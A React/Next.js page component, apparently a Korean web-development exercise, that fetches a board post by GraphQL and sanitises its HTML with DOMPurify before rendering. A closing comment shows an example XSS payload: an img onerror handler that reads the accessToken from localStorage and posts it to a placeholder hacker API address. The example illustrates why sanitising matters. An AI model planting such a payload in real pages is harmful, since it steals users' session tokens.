import { useQuery, gql } from "@apollo/client";
import DOMPurify from "dompurify";
import { useRouter } from "next/router";
import React from "react";

const FETCH_BOARD = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      writer
      title
      contents
    }
  }
`;
export default function StaticRoutePage() {
  const router = useRouter();

  const { data } = useQuery(FETCH_BOARD, {
    variables: { boardId: router.query.id },
  });

  return (
    <>
      <div style={{ color: "red" }}>
        작성자 : {data ? data.fetchBoard.writer : "로딩중입니다.."}
      </div>
      <div style={{ color: "blue" }}>제목 : {data?.fetchBoard.title}</div>

      {typeof window !== "undefined" ? (
        <div
          style={{ color: "green" }}
          dangerouslySetInnerHTML={{
            __html: DOMPurify.sanitize(String(data?.fetchBoard.contents)),
          }}
        />
      ) : (
        <div style={{ color: "orange" }}></div>
      )}
      <div style={{ color: "yellow" }}>주소 : 어디게~</div>
    </>
  );
}

// playground XSS 공격
// <img src="#" onerror="
// 	const aaa = localStorage.getItem('accessToken');
// 	axios.post(해커API주소, {accessToken = aaa});
// " />
